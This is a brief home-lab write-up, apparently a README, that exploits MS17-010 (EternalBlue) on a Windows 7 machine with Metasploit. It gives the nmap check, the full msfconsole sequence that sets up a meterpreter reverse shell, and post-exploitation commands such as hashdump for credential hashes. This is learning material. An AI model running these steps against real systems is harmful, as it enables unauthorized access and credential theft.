# Attacking with Metasploit

Before launching an attack with metasploit I first needed to check if my Windows 7 machine was vulnerable by using ```` nmap -p 445 --script smb-vuln-ms17-010 192.168.10.12````

By using this command I can check if the machine is vulnerable. In our case here, it came back as vulnerable, which is one of the millions of reasons why no one should ever use an outdated OS like Windows 7.

I opened up Metasploit using the command ````msfconsole```` and used the following commands:

````
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.10.12
RHOSTS => 192.168.10.12
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.10.35
LHOST => 192.168.10.35
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
````

Just like that I had full access to a Windows 7 System. So how does this vulnerability work?

## What is MS17-010?

Found in 2017, MS17-010 is a RCE (Remote Code Execution) vulnerability that lies within SMBv1. An attacker sends a specially crafted message, in this case we used the exploit ms17_010_eternalblue to create a reverse shell on the windows 7 system, effectively giving us full access to the system. No wonder why this vulnerbility is rated 9.8 on the CVSS scale! Here are a few cool, but simple commands I ran while having full access:

hashdump: Dumps all the hashes of credentials which than can lead to password leaks

sysinfo: Gives basic info about the system

screenshot: Takes a screenshot of what the user sees on the GUI 

![Screenshot 2025-02-19 213344](https://github.com/user-attachments/assets/e850d934-0b09-4b94-99e3-b530a17713fb)



From this point on, an attacker could steal credentials, maintain persistence, escalate privelages (although we are already running as an admin), run a bitcoin miner, basically do whatever they want.
